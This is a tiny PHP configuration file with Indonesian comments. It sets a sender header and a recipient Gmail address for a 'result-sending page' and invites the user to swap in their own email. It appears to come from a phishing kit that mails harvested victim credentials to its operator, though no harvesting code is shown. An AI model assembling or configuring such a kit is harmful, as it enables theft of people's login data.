<?php
// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = '';
$sender = 'From: ASELOLE MAX <juragan.bong@gmail.com>';

$emailku = 'juragan.bong@gmail.com'; // GANTI EMAIL KAMU DISINI
?>